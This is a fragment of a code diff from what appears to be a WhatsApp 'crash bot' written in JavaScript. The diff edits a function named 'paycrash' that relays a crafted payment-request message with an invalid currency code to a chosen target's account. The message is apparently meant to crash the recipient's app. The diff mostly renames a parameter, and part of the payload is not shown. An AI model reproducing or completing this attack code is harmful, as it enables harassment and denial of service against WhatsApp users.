@@ -2007,9 +2007,9 @@ https://chat.whatsapp.com/I24OwNUuBzk6KRDeNDF62e
 
 THX TO OM TAMA, KARENA DIA SAYA MENDAPATKAN SEBUAH IDE TENTANG QUOTED INI
 */
-async function paycrash(isTarget) {
-    await kipop.relayMessage(
-        isTarget,
+async function paycrash(target) {
+    kipop.relayMessage(
+        target,
         {
             requestPaymentMessage: {
                 currencyCodeIso4217: "XXX",
@@ -2044,7 +2044,7 @@ async function paycrash(isTarget) {
             }
         },
         {
-            participant: { jid: isTarget }
+            participant: { jid: target }
         }
     );
 
